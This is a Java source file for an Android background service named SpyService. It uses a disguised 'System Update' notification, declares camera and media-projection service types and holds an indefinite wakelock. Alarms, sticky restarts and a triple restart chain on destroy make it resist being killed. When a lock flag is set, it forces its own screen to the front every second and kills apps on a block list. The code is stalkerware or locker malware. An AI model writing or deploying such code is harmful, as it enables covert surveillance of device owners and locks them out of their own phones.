package com.nullx.pp;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.util.List;

public class SpyService extends Service {

    private static final String CHANNEL_ID  = "SpyServiceChannel";
    private static final int    ALARM_CODE  = 0xAB;
    private static final long   ALARM_INTERVAL = 60_000L;   // 60 detik

    private Handler  handler = new Handler(Looper.getMainLooper());
    private Runnable enforcerRunnable;
    private boolean  running = true;

    // WakeLock — cegah CPU sleep saat service jalan
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        acquireWakeLock();
        createNotificationChannel();
        startForegroundCompat();
        startEnforcerLoop();
        scheduleAlarmWatchdog(this);    // AlarmManager backup
    }

    // ── FOREGROUND ─────────────────────────────────────────────────
    private void startForegroundCompat() {
        Notification notif = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Processing...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(1, notif,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(1, notif);
        }
    }

    // ── WAKELOCK ───────────────────────────────────────────────────
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SpyService::WakeLock"
            );
            wakeLock.acquire(); // no timeout — held until release()
        } catch (Exception e) {}
    }

    // ── ALARM WATCHDOG (60 detik sekali restart diri sendiri) ───────
    public static void scheduleAlarmWatchdog(Context ctx) {
        try {
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            Intent i = new Intent(ctx, WatchdogReceiver.class);
            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                : PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getBroadcast(ctx, ALARM_CODE, i, flags);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + ALARM_INTERVAL,
                    pi
                );
            } else {
                am.setExact(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + ALARM_INTERVAL,
                    pi
                );
            }
        } catch (Exception e) {}
    }

    // ── ENFORCER LOOP (1 detik) ────────────────────────────────────
    private void startEnforcerLoop() {
        enforcerRunnable = new Runnable() {
            @Override public void run() {
                if (!running) return;
                try {
                    boolean locked = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
                        .getBoolean("is_locked", false);

                    if (locked) {
                        if (!isAppForeground()) {
                            Intent i = new Intent(getApplicationContext(), MainActivity.class);
                            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                                       Intent.FLAG_ACTIVITY_REORDER_TO_FRONT |
                                       Intent.FLAG_ACTIVITY_SINGLE_TOP);
                            startActivity(i);
                        }
                        enforceLockTask();
                    }
                    enforceBlockedApps();
                } catch (Exception e) {}

                handler.postDelayed(this, 1000);
            }
        };
        handler.post(enforcerRunnable);
    }

    private boolean isAppForeground() {
        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
        if (procs == null) return false;
        for (ActivityManager.RunningAppProcessInfo p : procs) {
            if (p.processName.equals(getPackageName()) &&
                p.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                return true;
            }
        }
        return false;
    }

    private void enforceLockTask() {
        try {
            DevicePolicyManager dpm =
                (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = AppDeviceAdminReceiver.getComponentName(this);
            if (dpm.isDeviceOwnerApp(getPackageName())) {
                dpm.setLockTaskPackages(admin, new String[]{getPackageName()});
            }
        } catch (Exception e) {}
    }

    private void enforceBlockedApps() {
        try {
            boolean blockingOn = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
                .getBoolean("blocking_on", false);
            if (!blockingOn) return;

            String blocked = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
                .getString("blocked_apps", "");
            if (blocked.isEmpty()) return;

            String[] blockedPkgs = blocked.split(",");
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
            if (procs == null) return;

            for (ActivityManager.RunningAppProcessInfo p : procs) {
                for (String pkg : blockedPkgs) {
                    if (p.processName.trim().equals(pkg.trim()) &&
                        p.importance <= ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                        am.killBackgroundProcesses(pkg.trim());
                    }
                }
            }
        } catch (Exception e) {}
    }

    // ── LIFECYCLE ──────────────────────────────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // START_STICKY — OS restart service setelah kill
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // APK di-swipe dari recent → restart langsung
        restartSelf();
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        running = false;
        if (enforcerRunnable != null) handler.removeCallbacks(enforcerRunnable);
        releaseWakeLock();

        // Chain 1: Broadcast ke RestarterReceiver
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("RestartSpyService");
        broadcastIntent.setClass(this, RestarterReceiver.class);
        sendBroadcast(broadcastIntent);

        // Chain 2: Re-schedule alarm watchdog
        scheduleAlarmWatchdog(this);

        // Chain 3: Langsung restart diri
        restartSelf();

        super.onDestroy();
    }

    private void restartSelf() {
        try {
            Intent i = new Intent(getApplicationContext(), SpyService.class);
            i.setPackage(getPackageName());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception e) {}
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        } catch (Exception e) {}
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "System Background Service",
                NotificationManager.IMPORTANCE_LOW
            );
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }
}
